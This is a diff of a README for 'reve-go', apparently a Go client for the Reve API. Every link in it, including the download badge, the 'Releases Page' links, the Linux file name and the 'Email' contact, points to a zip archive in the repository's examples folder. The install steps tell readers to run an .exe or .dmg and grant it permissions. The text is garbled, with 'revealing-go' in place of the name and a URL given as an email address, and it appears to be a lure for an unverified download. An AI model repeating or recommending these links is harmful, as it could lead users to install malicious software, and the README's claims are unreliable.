@@ -1,6 +1,6 @@
 # 🌟 reve-go - Effortlessly Use the Reve API
 
-[![Download Reve-go](https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip%20Reve--go-%2300C4CC?style=for-the-badge&logo=github)](https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip)
+[![Download Reve-go](https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip%20Reve--go-%2300C4CC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip)
 
 ## 📦 Overview
 
@@ -22,14 +22,14 @@ Ensure you have a stable internet connection to download the application and acc
 
 ### 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip)
 
 1. Click on the above link to access the Releases page.
 2. Look for the latest version of revealing-go.
 3. Download the file that matches your operating system.
    - For Windows, download `.exe` file.
    - For macOS, download `.dmg` file.
-   - For Linux, download the appropriate `https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip` file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip` file.
 4. Once downloaded, open the file and follow the installation prompts. You may need to allow permissions for the installation.
 
 ## ⚙️ Usage Instructions
@@ -80,11 +80,11 @@ If you encounter issues, here are some common solutions:
 
 If you need help, feel free to reach out:
 
-- **Email**: https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip
+- **Email**: https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip
 - **GitHub Issues**: Report problems or request features using the GitHub issues page.
 
 ## 🌍 Stay Updated
 
-Stay tuned for updates and features by checking the Releases page often: [Releases Page](https://github.com/bheki522/reve-go/raw/refs/heads/main/examples/create/reve-go-v2.9.zip).
+Stay tuned for updates and features by checking the Releases page often: [Releases Page](https://raw.githubusercontent.com/bheki522/reve-go/main/examples/create/go_reve_2.9.zip).
 
 Happy creating with reve-go!
